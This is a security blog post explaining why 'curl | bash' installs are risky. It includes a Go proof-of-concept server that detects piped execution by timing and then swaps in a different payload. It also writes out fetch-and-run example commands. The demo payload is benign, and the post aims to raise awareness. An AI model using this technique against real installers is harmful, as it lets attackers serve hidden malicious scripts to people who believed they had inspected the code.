---
title: "The Dangers of curl | bash"
date: 2021-01-12T12:23:11Z
draft: true
toc: true
images:
tags:
  - golang
  - curl
  - bash
  - curlbash
  - cybersecurity
  - linux
---

I'm sure at some point or another we've all seen a software project that asks
you to installing it with a command like `curl https://install.example.com |
sudo bash`.

A few examples are [rustup](https://rustup.rs/),
[zerotier](https://github.com/zerotier/install.zerotier.com), and
[pyenv](https://github.com/pyenv/pyenv-installer).

_But why is it dangerous_ you ask? _Surely if [people on the internet advokate
the use of it](https://gist.github.com/btm/6700524) then it must fine?_ Well, it
depends what your definition of _fine_ is.

There are a few different issues with using `curl $URL | bash` that I want to
look at, two briefly and one in more detail.

From here on out I'll be using:

* `curl | bash` to refer to a command that downloads a file and sents the
  content via stdout to a shell (and example of a command like this being `curl
  https://install.example.com/ | sudo bash`)
* `$URL` to refer to the URL of the resource being being downloaded (in the
  previous example this would be `https://install.example.com/`)

## Possible Issues Scenarios

### 1. Interrupted Connections

When you `curl $URL | bash`, bash starts executing the script before the whole
of it was been downloaded. If you were to lose your connection to the server
before the script has finished downloading you may end up with half the script
having been executed and half of it not. This is a non-ideal situation that
could potentially leave your system in an unusable state (depending on the
script you were running).

### 2. Machine in the Middle (MitM)

A Machine in the Middle attack is when an attacker is in the middle on your
communication. This would allow them to modify the script as it is being
downloaded allowing them to run malicious commands on your machine.

A few ways to migigate this are by:

1. Using TLS. Curl will throw an error if a website has invalid TLS
   certificates. This means that if the script you are piping into bash uses
   https then you know there isn't a MitM (unless the MitM has an TLS cert for
   the domain in question that is signed by a CA you trust, in which case you
   have a bigger issue). You can run `curl https://self-signed.badssl.com/` as
   an example of how curl handles invalid TLS certificates.
2. Viewing the script in your browser first. If you navigate to `$URL` in your
   web browser first you can inspect the script to make sure that you trust it's
   content. This would be a valid solution, but turns out to not be effective.
   I'll discuss why now.

### 3. curl | bash Detection

It turns out that because of how unix pipelines work, a webserver can detect if
you are piping the output of `curl` or `wget` into an shell like `bash`.

I tweeted a proof of concept for this earlier.

{{< tweet 1326239169711108099 >}}

This attack is the main focus of this blog post an is inspired by
[https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)
which explains part of why this works but does not provide a proof of concept.
This was posted in 2016 and I haven't been able to find much else out this.

As mentioned in section 1, if the content being downloaded is over a certain
size then bash will start exectuing commands before the whole file has been
download. Curl will fill the a buffer, bash will read and execute the commands,
curl will fetch more data from the server and fill the buffer again. This whole
process repeats until the whole script has been downloaded and executed by bash.

If bash is doing something time consuming (e.g. executing a `sleep` command)
then it will take longer before it empties the buffer and curl requests more of
the script. If the script is just being displayed (if you just `curl $URL` or if
you open `$URL` in a web browser) then there will be no delay as the `sleep`
command isn't being executed. We can detect this time difference on the server
the script is being download from.

I am going to quickly walk you through the Proof of Concept (PoC) I made in go.

Firstly I setup a simple go program that acts as an http server. It will listen
on port `:8080` and send requests to a function called `handler` (which I am
going to show you in the next sep).

```go
package main

import (
  "fmt"
  "net/http"
  "strings"
  "time"
)

func main() {
  http.HandleFunc("/", handler)
  http.ListenAndServe(":8080", nil)
}
```

The handler function is relativly simple.

Firstly we create a payload that we will use to detect if the code being
download is being executed or just displayed/stored. This example sends a script
that outputs _Hello World!_, sleeps for 1 second and has a comment. This command
is then followed by the byte string `\xe2\x80\x8b` 1048576 times. This byte
string is a zero width character meaning that it won't be visible to the user if
the script is being sent to firefox or stdout unless they open it in something
like a hex editor.

This chars at the end are so long that they will fill the buffer more than once.

```go
func handler(res http.ResponseWriter, req *http.Request) {
  detect_payload := []byte("echo Hello World!\nsleep 1\n# A comment" + strings.Repeat("\xe2\x80\x8b", 1024*1024) + "\n")
}
```
We then define a malicious payload to send if the script is being executed and a
harmless payload to send if it is not.

```go
func handler(res http.ResponseWriter, req *http.Request) {
  detect_payload := []byte(
                  "echo Hello World!\nsleep 1\n# A comment"
                  + strings.Repeat("\xe2\x80\x8b", 1024*1024)
                  + "\n")

  malicious_payload := []byte("echo you have been pwned\n")
  harmless_payload := []byte("echo How are you?\n")
}
```

We can now set the response content type and status code, and send the detection
payload. However we won't end the request but instead start a timer. `res.Write`
is blocking meaning that the next line won't be executed until the whole of the
`detect_payload` has been requested by the client, and as it is longer than the
buffer if the code is being executed then bash will sleep before the rest of the
detect payload is requested. This means that when we measure the time that it
took for `res.Write` to run we can see if bash was executing the payload or not.

```go
func handler(res http.ResponseWriter, req *http.Request) {
  detect_payload := []byte(
                  "echo Hello World!\nsleep 1\n# A comment"
                  + strings.Repeat("\xe2\x80\x8b", 1024*1024)
                  + "\n")

  malicious_payload := []byte("echo you have been pwned\n")
  harmless_payload := []byte("echo How are you?\n")

  res.Header().Set("Content-Type", "text/plain; charset=UTF-8")
  res.WriteHeader(200)
  started_detect := time.Now()
  res.Write(detect_payload)
  ended_detect := time.Now()
  elapsed := ended_detect.Sub(started_detect)
}
```

Now we simply see if we waited around for at least a second (the lenght of the
sleep) and if we did send the malicous payload.

```go
func handler(res http.ResponseWriter, req *http.Request) {
  detect_payload := []byte(
                  "echo Hello World!\nsleep 1\n# A comment"
                  + strings.Repeat("\xe2\x80\x8b", 1024*1024)
                  + "\n")

  malicious_payload := []byte("echo you have been pwned\n")
  harmless_payload := []byte("echo How are you?\n")

  res.Header().Set("Content-Type", "text/plain; charset=UTF-8")
  res.WriteHeader(200)
  started_detect := time.Now()
  res.Write(detect_payload)
  ended_detect := time.Now()
  elapsed := ended_detect.Sub(started_detect)
  if elapsed.Seconds() > 1 {
    fmt.Println("curl|bash detected. response time: ", elapsed)
    res.Write(malicious_payload)
  } else {
    fmt.Println("non curl|bash. response time: ", elapsed)
    res.Write(harmless_payload)
  }
}
```

This is a very simple PoC but you could easily make something more effective and
discreate. If the user is `curl | bash`-ing a large install script that is
larger than the buffer and has elements that take a while to execute, then you
wouldn't need any `sleep` commands or large amounts of hidden whitespace to make
this work.

## Conclusion

I'm not going to make a comment on if you should use `curl | bash` or not, that
is up to you and your threat model. However I think it is important that people
are aware that this sort of attack is in fact possible.
